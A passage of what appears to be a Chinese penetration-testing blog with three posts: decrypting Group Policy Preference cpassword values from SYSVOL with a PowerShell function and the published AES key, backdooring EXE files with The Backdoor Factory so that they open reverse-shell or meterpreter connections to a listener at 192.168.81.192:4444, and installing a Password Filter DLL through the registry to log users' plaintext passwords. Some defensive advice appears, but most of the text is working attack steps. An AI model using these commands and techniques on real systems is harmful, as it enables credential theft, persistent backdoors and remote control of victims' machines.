<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-3.png" alt="Alt text"></p>

<p>更新，administrator(内置),设置密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-4.png" alt="Alt text"></p>

<p>委派，设置权限</p>

<p>在详细一栏，可看到该策略对应的ID为<code class="language-plaintext highlighter-rouge">{E6424F10-C44B-4C45-8527-740189CBF60E}</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-5.png" alt="Alt text"></p>

<p>至此，组策略配置完成，域内主机重新登录，即可应用此策略</p>

<p>在共享文件夹\SYSVOL中可看到组策略对应ID的文件夹，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-6.png" alt="Alt text"></p>

<p>由于我们刚刚修改了用户配置下的控制面板，所以在对应的文件夹下能找到配置文件Groups.xml，具体路径如下：</p>

<p><code class="language-plaintext highlighter-rouge">\\test.local\SYSVOL\test.local\Policies\{E6424F10-C44B-4C45-8527-740189CBF60E}\User\Preferences\Groups</code></p>

<p>Groups.xml内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt; 
- &lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;
- &lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (内置)" image="2" changed="2017-09-25 22:57:53" uid="{463245FF-08D3-4A28-95E7-42AB416DC508}"&gt;
  &lt;Properties action="U" newName="" fullName="" description="" cpassword="9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (内置)" /&gt; 
  &lt;/User&gt;
  &lt;/Groups&gt;
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-7.png" alt="Alt text"></p>

<p>值得注意的是其中的cpassword项，保存的是加密后的内容<code class="language-plaintext highlighter-rouge">"9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U"</code></p>

<p>加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</p>

<p>https://msdn.microsoft.com/en-us/library/cc422924.aspx</p>

<p>借助该私钥，我们就能还原出明文</p>

<p>还原方式可采用Chris Campbell @obscuresec开源的powershell脚本，地址如下：</p>

<p>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</p>

<p>该脚本可在域内主机上执行，能够自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/3-1.png" alt="Alt text"></p>

<p>当然，仅仅为了解密<code class="language-plaintext highlighter-rouge">cpassword="9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U"</code>，我们可以对以上powershell脚本的功能简化</p>

<p>简化代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Get-DecryptedCpassword {
    [CmdletBinding()]
    Param (
        [string] $Cpassword 
    )

    try {
        #Append appropriate padding based on string length  
        $Mod = ($Cpassword.length % 4)
        
        switch ($Mod) {
        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
        '2' {$Cpassword += ('=' * (4 - $Mod))}
        '3' {$Cpassword += ('=' * (4 - $Mod))}
        }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
        
        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
        
        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
        
        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    } 
    
    catch {Write-Error $Error[0]}
}  
Get-DecryptedCpassword "9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U"
</code></pre></div></div>

<p>还原出明文密码为domain123!，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/3-2.png" alt="Alt text"></p>

<h2 id="0x04-组策略中可被利用的地方">0x04 组策略中可被利用的地方</h2>
<hr>

<p>组策略中可被利用的地方不只在修改管理员密码的位置，还包括以下：</p>

<p>Services\Services.xml</p>
<ul>
  <li>http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)</li>
</ul>

<p>ScheduledTasks\ScheduledTasks.xml</p>
<ul>
  <li>http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)</li>
  <li>http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)</li>
  <li>http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)</li>
</ul>

<p>Printers\Printers.xml</p>
<ul>
  <li>http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)</li>
</ul>

<p>Drives\Drives.xml</p>
<ul>
  <li>http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)</li>
</ul>

<p>DataSources\DataSources.xml</p>
<ul>
  <li>http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)</li>
</ul>

<p><strong>注：</strong></p>

<p>位置引用自https://webcache.googleusercontent.com/search?q=cache:MUNO5X9hSwUJ:rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html+&amp;cd=6&amp;hl=en&amp;ct=clnk&amp;gl=us</p>

<p>但是以上位置并不绝对，在配置时需要在组策略中填入用户名密码，对应的Groups.xml才会包含cpassword属性，才能用于还原明文</p>

<p>可以拿计划任务来举例，对应ScheduledTasks.xml</p>

<p>组策略配置的位置为：用户配置-首选项-控制面板设置-计划任务</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-1.png" alt="Alt text"></p>

<p>新建任务，需要选中运行身份，填入用户名和密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-2.png" alt="Alt text"></p>

<p>否则，不包含cpassword属性，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-3.png" alt="Alt text"></p>

<p>现在填入一个测试密码(密码为testsuccess!，假的)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-4.png" alt="Alt text"></p>

<p>对应ScheduledTasks.xml也会包含cpassword属性，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-5.png" alt="Alt text"></p>

<p>使用powershell对其解密，还原出密码为testsuccess!</p>

<p>至此得出结论：</p>

<p><strong>域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密</strong></p>

<p>这就造成了安全隐患，现实中域管理员往往会在组策略中使用域管理员密码,组策略配置文件中的密码很容易被获得，导致权限提升</p>

<p>为此，微软发布了补丁KB2962486，下载地址：</p>

<p>https://technet.microsoft.com/library/security/ms14-025</p>

<p>系统打了补丁后，组策略中无法设置用户名密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/5-1.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/5-2.png" alt="Alt text"></p>

<p>当然，共享文件夹\SYSVOL下的xml文件也就不再包含cpassword属性</p>

<p><strong>注：</strong></p>

<p>xml文件还是会和组策略保持同步</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>结合攻击方法，可供选择的防御方法如下：</p>

<p>1、使用LAPS批量管理域内主机本地管理员帐户</p>

<p>2、域控安装补丁KB2962486</p>

<p>3、不在组策略中使用域控密码</p>

<p>4、设置共享文件夹\SYSVOL的访问权限</p>

<p>5、使用PsPasswd批量修改域内主机本地管理员密码</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了如何利用SYSVOL还原组策略中保存的密码，给出了防御建议。如果域用户的本地管理员密码被攻击者获得，默认可被用于在域中远程登录。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 25, 2017
  </div>

  
</article><article class="post">
  <h1>利用BDF向EXE文件植入后门</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>
<p><code class="language-plaintext highlighter-rouge">The Backdoor Factory</code>可用来向可执行文件植入后门，修改程序执行流程，执行添加的payload。</p>

<p>本文将要介绍向EXE文件植入后门的原理，测试<code class="language-plaintext highlighter-rouge">The Backdoor Factory</code>植入后门的方法，分析细节，总结思路。</p>

<p>The Backdoor Factory下载地址：</p>

<p>https://github.com/secretsquirrel/the-backdoor-factory</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍如下内容：</p>

<ul>
  <li>EXE文件后门植入原理</li>
  <li>实际测试The Backdoor Factory</li>
  <li>分析The Backdoor Factory功能</li>
</ul>

<h2 id="0x02-基础知识">0x02 基础知识</h2>
<hr>

<p><strong>PE文件格式：</strong></p>

<p>参考资料：</p>

<p>https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files</p>

<p><strong>Code Caves：</strong></p>

<p>参考资料：</p>

<p>https://www.codeproject.com/Articles/20240/The-Beginners-Guide-to-Codecaves</p>

<p><strong>Code Caves的直观认识：</strong></p>

<p>使用<code class="language-plaintext highlighter-rouge">vc6.0</code>生成exe文件，查看文件中可利用的Code Caves</p>

<p>c代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

int array[200]={1,2,3,4,5,6,7,8,9};
char array2[200]="123456789ABCDEF";

int main(int argc, char* argv[])
{
	printf("hello world");	
	return 0;
}
</code></pre></div></div>

<p>Release编译生成文件，使用Immunity Debugger打开</p>

<p><code class="language-plaintext highlighter-rouge">View</code>-<code class="language-plaintext highlighter-rouge">Memory</code>(快捷键Alt+M)</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-1.png" alt="Alt text"></p>

<p>hello.exe包含四个区段,分别为<code class="language-plaintext highlighter-rouge">PE header</code>、<code class="language-plaintext highlighter-rouge">.text</code>、<code class="language-plaintext highlighter-rouge">.rdata</code>和<code class="language-plaintext highlighter-rouge">.data</code></p>

<p>查看hello.exe的<code class="language-plaintext highlighter-rouge">.data</code>段</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-2.png" alt="Alt text"></p>

<p>发现大段的0x00数据，这些位置可被替换成payload</p>

<h2 id="0x03-文件后门植入原理">0x03 文件后门植入原理</h2>
<hr>

<h3 id="植入原理">植入原理</h3>

<p>修改程序的执行流程，跳转到Code Caves，执行payload，再返回至程序的正常流程</p>

<p>需要注意的是程序默认只有<code class="language-plaintext highlighter-rouge">.text</code>段具有执行权限，如果将payload添加到其他段(如<code class="language-plaintext highlighter-rouge">.data</code>或<code class="language-plaintext highlighter-rouge">.rdata</code>)，需要将该段添加执行权限</p>

<p><strong>注：</strong></p>

<p>实际使用可通过跳转多个Code Caves拼凑执行payload</p>

<h3 id="利用思路">利用思路</h3>

<h4 id="1新加区段权限为可读可写可执行rwe">1、新加区段，权限为可读可写可执行(RWE)</h4>

<p>可使用工具LordPE</p>

<p>手动添加可参考资料：</p>

<p>https://www.exploit-db.com/docs/42061.pdf</p>

<p><strong>优点：</strong></p>

<p>简单直接，不需要考虑文件Code Caves的大小</p>

<p><strong>缺点：</strong></p>

<p>增加文件长度</p>

<h4 id="2使用code-caves">2、使用Code Caves</h4>

<p>搜索已有区段，寻找是否存在可用的Code Caves，对于不可执行的区段，还需要添加可执行权限</p>

<p><strong>优点：</strong></p>

<p>不改变文件大小</p>

<p><strong>缺点：</strong></p>

<p>需要考虑Code Caves的大小是否满足payload长度</p>

<h2 id="0x04-实际测试the-backdoor-factory">0x04 实际测试The Backdoor Factory</h2>
<hr>

<p>Kali 2.0默认集成<code class="language-plaintext highlighter-rouge">The Backdoor Factory</code>，路径为<code class="language-plaintext highlighter-rouge">usr/share/backdoor-factory</code></p>

<p>测试系统选为<code class="language-plaintext highlighter-rouge">Kali 2.0</code></p>

<p>为便于测试，测试exe代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

int array[200]={1,2,3,4,5,6,7,8,9};
char array2[200]="123456789ABCDEF";

int main(int argc, char* argv[])
{
	printf("hello world\n");	
	system("PAUSE"); 
	return 0;
}
</code></pre></div></div>

<p>程序输出hello world后暂停</p>

<p>下面挑选The Backdoor Factory中常见的功能进行介绍</p>

<h3 id="1检查该文件是否适用于the-backdoor-factory">1、检查该文件是否适用于The Backdoor Factory</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -S
</code></pre></div></div>

<p>输出如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Checking if binary is supported
[*] Gathering file info
[*] Reading win32 entry instructions
test.exe is supported.
</code></pre></div></div>

<h3 id="2获取该文件的可用payload">2、获取该文件的可用payload</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -s show
</code></pre></div></div>

<p>输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-3.png" alt="Alt text"></p>

<p>可用payload如下：</p>

<ul>
  <li>cave_miner_inline</li>
  <li>iat_reverse_tcp_inline</li>
  <li>iat_reverse_tcp_inline_threaded</li>
  <li>iat_reverse_tcp_stager_threaded</li>
  <li>iat_user_supplied_shellcode_threaded</li>
  <li>meterpreter_reverse_https_threaded</li>
  <li>reverse_shell_tcp_inline</li>
  <li>reverse_tcp_stager_threaded</li>
  <li>user_supplied_shellcode_threaded</li>
</ul>

<p><strong>名称解析：</strong></p>

<p><strong>cave_miner_inline:</strong></p>

<p>作为payload模板，长度为135，仅实现了控制流程跳转，不做其他操作，可用作自定义开发shellcode的模板</p>

<p>反汇编的payload格式如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-4.png" alt="Alt text"></p>

<p><strong>reverse_shell_tcp_inline：</strong></p>

<p>对应meterpreter server：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
</code></pre></div></div>

<p><strong>meterpreter_reverse_https_threaded：</strong></p>

<p>对应meterpreter server：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_https
</code></pre></div></div>

<p><strong>iat_reverse_tcp_inline中的iat：</strong></p>

<p>iat为Import Address Table(导入地址表)的缩写，如果PE文件的IAT不包含API LoadLibraryA和GetProcAddress，直接执行payload <code class="language-plaintext highlighter-rouge">reverse_shell_tcp_inline</code>会失败，<code class="language-plaintext highlighter-rouge">iat_reverse_tcp_inline</code>增加了修复IAT的功能，避免执行失败</p>

<p><strong>user_supplied_shellcode_threaded：</strong></p>

<p>自定义payload，payload可通过msf生成</p>

<h3 id="3搜索该文件可用的code-caves">3、搜索该文件可用的Code Caves</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -c
</code></pre></div></div>

<p>如果payload长度为703，那么Code Caves需要满足长度大于703，参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -c -l 703
</code></pre></div></div>

<p>输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-5.png" alt="Alt text"></p>

<p>共找到三个可供利用的位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>No section
-&gt;Begin Cave 0x240
-&gt;End of Cave 0x1000
Size of Cave (int) 3520
**************************************************
No section
-&gt;Begin Cave 0x693a
-&gt;End of Cave 0x700c
Size of Cave (int) 1746
**************************************************
We have a winner: .data
-&gt;Begin Cave 0x7051
-&gt;End of Cave 0x7350
Size of Cave (int) 767
SizeOfRawData 0x1000
PointerToRawData 0x7000
End of Raw Data: 0x8000
</code></pre></div></div>

<p>输出的地址为相对虚拟地址(Relative Virtual Address)，即相对于文件头(基地址Image Base)的偏移地址</p>

<p>在内存中的实际地址(虚拟地址Virtual Address)=Image Base+RVA</p>

<p>ImageBase = 0x00400000</p>

<p>使用Immunity Debugger查看内存结构，进行验证</p>

<p>内存结构如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-6.png" alt="Alt text"></p>

<p><strong>(1)</strong></p>

<p>No section
-&gt;Begin Cave 0x240
-&gt;End of Cave 0x1000
Size of Cave (int) 3520</p>

<p>内存中实际地址为0x00400240-0x00401000，位于PE header中，默认权限为<code class="language-plaintext highlighter-rouge">R</code></p>

<p>查看内存地址数据如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-7.png" alt="Alt text"></p>

<p><strong>(2)</strong></p>

<p>No section
-&gt;Begin Cave 0x693a
-&gt;End of Cave 0x700c
Size of Cave (int) 1746</p>

<p>内存中实际地址为0x0040693a-0x0040700c,位于.rdata段中，默认权限为<code class="language-plaintext highlighter-rouge">R</code></p>

<p>查看内存地址数据如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-8.png" alt="Alt text"></p>

<p><strong>(3)</strong></p>

<p>We have a winner: .data
-&gt;Begin Cave 0x7051
-&gt;End of Cave 0x7350
Size of Cave (int) 767</p>

<p>内存中实际地址为0x00407051-0x00407350,位于.data段中，默认权限为<code class="language-plaintext highlighter-rouge">RW</code></p>

<p>查看内存地址数据如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-9.png" alt="Alt text"></p>

<p>可以看到，通过The Backdoor Factory找到的Code Caves均符合要求</p>

<h3 id="4添加payload">4、添加payload</h3>

<p>这里选用<code class="language-plaintext highlighter-rouge">reverse_tcp_stager_threaded</code>进行测试，payload长度为703</p>

<p>Server：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
</code></pre></div></div>

<h4 id="1-添加新区段保存payload">(1) 添加新区段，保存payload</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -a -o test1.exe
</code></pre></div></div>

<p>新区段名称为<code class="language-plaintext highlighter-rouge">.sdata</code>，权限为<code class="language-plaintext highlighter-rouge">RWE</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-1.png" alt="Alt text"></p>

<p>若指定新添加区段名称为aaa,参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -a -n aaa -o test1.exe
</code></pre></div></div>

<h4 id="2-payload保存到data段中">(2) payload保存到.data段中</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -o test2.exe
</code></pre></div></div>

<p>根据提示选择<code class="language-plaintext highlighter-rouge">.data</code>段</p>

<p><code class="language-plaintext highlighter-rouge">.data</code>段权限更改为<code class="language-plaintext highlighter-rouge">RWE</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-2.png" alt="Alt text"></p>

<p>程序入口点添加跳转代码<code class="language-plaintext highlighter-rouge">JMP TEST2.00407055</code>，<code class="language-plaintext highlighter-rouge">0x00407055</code>保存添加的payload</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-3.png" alt="Alt text"></p>

<h4 id="3-payload保存到其他段中">(3) payload保存到其他段中</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -o test3.exe
</code></pre></div></div>

<p>根据提示选择PE header，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-4.png" alt="Alt text"></p>

<p>执行会报错，需要对其进行修复</p>

<p>可使用工具<code class="language-plaintext highlighter-rouge">nasm_shell</code>将汇编代码转换为十六进制数据</p>

<p>Kali2.0默认集成nasm_shell</p>

<p>工具使用如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-5.png" alt="Alt text"></p>

<h4 id="4-自定义payload">(4) 自定义payload</h4>

<p>生成payload：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/messagebox -f raw &gt;msg.bin
</code></pre></div></div>

<p>添加payload：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./backdoor.py -f test.exe -s user_supplied_shellcode_threaded -U msg.bin -o test4.exe
</code></pre></div></div>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-6.png" alt="Alt text"></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了使用<code class="language-plaintext highlighter-rouge">The Backdoor Factory</code>向EXE文件植入后门的方法，利用Code Caves能够不改变原文件的大小。</p>

<p>当然，该利用方法已经被杀毒软件查杀，本文介绍的内容仅作技术研究。</p>

<p>站在防御的角度，下载文件时需要多加注意，只从可信源下载程序，同时校验文件hash。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 20, 2017
  </div>

  
</article><article class="post">
  <h1>Password Filter DLL在渗透测试中的应用</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章《域渗透——Hook PasswordChangeNotify》介绍了通过dll注入Hook PasswordChangeNotify来记录新密码的方法，相当于是对API PasswordChangeNotify的利用。
我们知道，API PasswordChangeNotify是Password Filter DLL的一个功能函数，那么，对于Password Filter DLL本身，能否直接开发一个可供利用的DLL呢？</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Password Filter DLL简介</li>
  <li>利用Password Filter DLL记录明文密码</li>
  <li>利用Password Filter DLL实现的后门</li>
  <li>非Windows Server系统下的应用</li>
</ul>

<h2 id="0x02-password-filter-dll简介">0x02 Password Filter DLL简介</h2>
<hr>

<p>现实中使用Windows系统时，为了提高系统安全性，防止用户密码被暴力破解，系统管理员往往会对用户密码的复杂度提出要求，可通过配置组策略开启</p>

<p>位置如下：</p>

<p><code class="language-plaintext highlighter-rouge">gpedit.msc</code> -&gt; <code class="language-plaintext highlighter-rouge">本地计算机策略</code> -&gt; <code class="language-plaintext highlighter-rouge">计算机配置</code> -&gt; <code class="language-plaintext highlighter-rouge">Windows设置</code> -&gt; <code class="language-plaintext highlighter-rouge">安全设置</code> -&gt; <code class="language-plaintext highlighter-rouge">帐户策略</code> -&gt; <code class="language-plaintext highlighter-rouge">密码策略</code> -&gt; <code class="language-plaintext highlighter-rouge">密码必须符合复杂性要求</code></p>

<p>启用后，密码必须符合下列最低要求:</p>

<ul>
  <li>不能包含用户的帐户名，不能包含用户姓名中超过两个连续字符的部分</li>
  <li>至少有六个字符长</li>
  <li>包含以下四类字符中的三类字符:</li>
  <li>英文大写字母(A 到 Z)</li>
  <li>英文小写字母(a 到 z)</li>
  <li>10 个基本数字(0 到 9)</li>
  <li>非字母字符(例如 !、$、#、%)</li>
</ul>

<p>默认值:</p>

<ul>
  <li>在域控制器上启用</li>
  <li>在独立服务器上禁用</li>
</ul>

<p>如果该策略仍无法满足对密码复杂度的要求，可以使用Password Filter DLL进一步提高密码的复杂度</p>

<h3 id="实现思路">实现思路：</h3>

<ol>
  <li>通过修改注册表的方式安装Password Filter DLL</li>
  <li>用户修改密码时，自动加载Password Filter DLL，导入明文密码</li>
  <li>在Password Filter DLL中开发者可以自定义密码复杂度，同明文密码的复杂度进行比较，如果明文密码不满足复杂度条件，弹框提醒用户，密码修改失败</li>
</ol>

<p>具体使用方法可参考官方文档：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx</p>

<h2 id="0x03-password-filter-dll的开发">0x03 Password Filter DLL的开发</h2>
<hr>

<p>支持以下三个函数：</p>

<ul>
  <li>
    <p>BOOLEAN InitializeChangeNotify(void);</p>
  </li>
  <li>
    <p>NTSTATUS PasswordChangeNotify(<em>In</em> PUNICODE_STRING UserName,<em>In</em> ULONG RelativeId,<em>In</em> PUNICODE_STRING NewPassword);</p>
  </li>
  <li>
    <p>BOOLEAN PasswordFilter(<em>In</em> PUNICODE_STRING AccountName,<em>In</em> PUNICODE_STRING FullName,<em>In</em> PUNICODE_STRING Password,<em>In</em> BOOLEAN SetOperation);</p>
  </li>
</ul>

<p>参考资料：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/ms721849(v=vs.85).aspx#password_filter_functions</p>

<p>值得注意的地方：</p>

<ul>
  <li>API PasswordChangeNotify和PasswordFilter的传入参数均包括用户的明文密码</li>
  <li>API PasswordFilter的返回值为TRUE表示密码符合要求，返回FALSE表示密码不符合复杂度要求，弹框提示用户修改</li>
  <li>在编写Password Filter DLL时，需要声明导出函数</li>
</ul>

<p>提供一个可供参考的POC，地址如下：</p>

<p>https://github.com/3gstudent/PasswordFilter</p>

<p>该工程声明了导出函数<code class="language-plaintext highlighter-rouge">InitializeChangeNotify</code>、<code class="language-plaintext highlighter-rouge">PasswordChangeNotify</code>和<code class="language-plaintext highlighter-rouge">PasswordFilter</code></p>

<p>分别使用<code class="language-plaintext highlighter-rouge">PasswordChangeNotify</code>和<code class="language-plaintext highlighter-rouge">PasswordFilter</code>记录明文密码，保存在<code class="language-plaintext highlighter-rouge">c:\logFile1</code>和<code class="language-plaintext highlighter-rouge">c:\logFile2</code></p>

<p>在编译时需要同目标系统的平台对应</p>

<p>%wZ表示输出PUNICODE_STRING，unicode的字符串指针类型</p>

<h2 id="0x04-password-filter-dll的安装">0x04 Password Filter DLL的安装</h2>
<hr>

<p>1、注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的<code class="language-plaintext highlighter-rouge">Notification Packages</code>，添加Password Filter DLL的名称，不包括后缀名.dll</p>

<p>2、将Password Filter DLL保存在%windir%\system32\下</p>

<p>3、组策略开启组策略密码必须符合复杂性要求</p>

<p>4、重启系统(注销当前用户不会生效)</p>

<p>5、修改任一用户密码，加载Password Filter DLL</p>

<h3 id="实际测试">实际测试：</h3>

<p>测试系统： Windows Server 2008 R2 x64</p>

<p>将Password Filter DLL工程编译生成64位的Win32Project3.dll</p>

<p>1、将Win32Project3.dll保存在%windir%\system32\下</p>

<p>2、修改注册表键值<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的<code class="language-plaintext highlighter-rouge">Notification Packages</code>，添加<code class="language-plaintext highlighter-rouge">Win32Project3</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-3/2-1.png" alt="Alt text"></p>

<p>通过命令行实现的方式如下：</p>

<p>读取键值：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
</code></pre></div></div>

<p>获得键值内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    Notification Packages    REG_MULTI_SZ    scecli\0rassfm
</code></pre></div></div>

<p>添加Win32Project3：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0rassfm\0Win32Project3" /f
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">\0</code>表示换行</p>

<p>3、Windows Server系统的组策略默认开启密码必须符合复杂性要求</p>

<p>4、重启系统</p>

<p>5、修改用户密码</p>

